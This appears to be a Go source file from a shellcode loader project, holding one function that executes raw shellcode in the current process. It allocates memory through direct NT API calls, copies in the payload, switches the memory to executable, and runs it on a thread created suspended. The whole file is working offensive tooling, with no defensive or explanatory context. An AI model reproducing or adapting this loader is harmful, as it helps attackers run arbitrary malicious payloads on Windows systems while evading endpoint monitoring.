package techniques

import (
	"syscall"
	"unsafe"

	"loader/internal/ntapi"
)

func NtSuspended(sc []byte) bool {
	var base uintptr
	sz := uintptr(len(sc))

	r1, _, _ := ntapi.NtAllocateVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&sz)),
		memCommit|memReserve, pageReadWrite)
	if !ntSuccess(r1) {
		return false
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(base)), len(sc)), sc)

	var oldProt uint32
	sz = uintptr(len(sc))
	ntapi.NtProtectVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		pageExecuteRead,
		uintptr(unsafe.Pointer(&oldProt)))

	var thread uintptr
	r1, _, _ = ntapi.NtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&thread)),
		threadAllAccess, 0, currentProcess,
		base, 0, 0x1, 0, 0, 0, 0)
	if !ntSuccess(r1) {
		return false
	}

	ntapi.ResumeThread.Call(thread)
	ntapi.NtWaitForSingleObject.Call(thread, 0, 0)
	syscall.CloseHandle(syscall.Handle(thread))
	return true
}
